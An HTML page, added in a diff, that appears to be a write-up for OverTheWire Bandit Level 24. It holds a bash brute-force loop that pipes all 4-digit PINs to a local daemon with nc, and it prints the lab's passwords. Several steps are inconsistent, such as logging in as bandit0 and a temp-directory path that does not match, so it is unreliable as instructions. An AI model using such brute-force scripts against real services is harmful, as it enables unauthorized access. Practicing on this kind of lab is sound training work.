@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bandit Level 24 Writeup</title>
+    <link rel="stylesheet" href="../style.css"> <!-- adjust path if needed -->
+</head>
+<body>
+    <div id="writeup-container">
+        <h1>Bandit Level 24</h1>
+
+        <pre>
+Goal: A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+You do not need to create new connections each time
+
+Steps:
+1. Open terminal and run:
+   ssh bandit0@bandit.labs.overthewire.org -p 2220
+2. Enter the password: Password: hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
+3. mktemp -d
+4. cd /tmp/temp
+5. nano bruteforce.sh
+6. 	#!/bin/bash
+	for i in {0000..9999}
+	do
+		echo hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv $i >> possibilities.txt
+	done
+cat possibilities.txt | nc localhost 30002 \\ add "> results.txt" if you don't want to watch the whole running textfile
+7. ./bruteforce.sh
+	
+
+Password: SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
+Commands:
+- Use 'ls' to list files
+- Use 'cat filename' to read files
+- Use 'exit' to end the ssh connection
+
+        </pre>
+
+        <p><a href="../index.html">Back to Terminal</a></p>
+    </div>
+</body>
+</html>
